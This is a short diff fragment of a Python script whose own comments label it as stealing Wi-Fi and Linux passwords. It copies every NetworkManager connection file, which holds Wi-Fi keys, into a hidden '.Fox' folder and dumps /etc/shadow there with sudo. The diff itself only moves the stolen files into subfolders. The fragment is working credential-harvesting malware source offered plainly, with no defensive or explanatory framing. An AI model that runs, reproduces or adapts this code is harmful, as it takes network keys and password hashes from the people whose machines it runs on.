@@ -6,14 +6,16 @@ from distutils.dir_util import copy_tree
 ### Steal WIFI Password On Linux ###
 files = os.listdir("/etc/NetworkManager/system-connections/")
 os.mkdir(".Fox")
+os.mkdir(".Fox/WIFI_PASS")
 num = 1
 for line in files:
     shutil.copy2("/etc/NetworkManager/system-connections/" + line,
-                 ".Fox/WIFI-" + str(num) + ".txt")
+                 ".Fox/WIFI_PASS/WIFI-" + str(num) + ".txt")
     num += 1
 
 ### Steal Linux Password ###
-os.system("sudo cat /etc/shadow > .Fox/OS_Pass.txt")
+os.mkdir(".Fox/OS_PASS")
+os.system("sudo cat /etc/shadow > .Fox/OS_PASS/OS_Pass.txt")
 
 ### Take Backup ###
 os.mkdir(".Fox/BackUP")
